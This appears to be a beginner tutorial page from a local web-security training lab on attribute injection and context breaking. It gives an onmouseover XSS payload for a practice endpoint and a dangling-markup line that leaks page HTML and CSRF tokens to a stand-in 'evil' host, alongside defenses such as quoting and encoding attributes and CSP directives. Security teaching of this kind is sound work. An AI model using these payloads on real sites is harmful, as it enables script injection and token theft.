# Head First · Module 08: Attribute Injection & Context Breaking

*A friendlier on-ramp. Read this first if the tutorial page feels dense — then go do the lab.*

---

Your input rarely lands in wide-open HTML. Usually it's *inside* an attribute: `<input value="HERE">`. To do anything you must first break out — and the key is one quote character.

The scary part: you can execute with **no `<` or `>` at all**. `" onmouseover="alert(1)` closes the value and adds a handler. Angle-bracket filters are useless here.

> **Brain Power**
> Unquoted attribute: `<a href=SEARCH>`. What single character ends the value and lets you inject a second attribute? (A space. That's why "always quote your attributes" is a hard rule.)

**Sharpen your pencil.** Fire `/profile?name=" onmouseover="alert(1)` and hover the field. Then `/profile-safe?name=` with the same — the quote becomes `&quot;` and can't break out.

Bonus horror: **dangling markup** steals data with *no JavaScript*. An unterminated `<img src="//evil/?leak=` swallows page HTML (including a CSRF token) into a URL the browser then fetches. "No script ran" ≠ "no compromise."

> **There are no Dumb Questions**
> **Q: If CSP blocks my script, am I safe from this module?**
> A: Not necessarily — dangling markup leaks via markup, not script. You also need `base-uri`/`form-action` and correct attribute encoding.

---

## Where to go next
- **Do the lab:** open `/m/module_08_attribute/` in the running lab (`python lab_server.py` or `node server.js`).
- **Design notes:** this module's `DECISIONS.md`.
- **Back to the map:** the repo `README.md` has the full 19-module path.
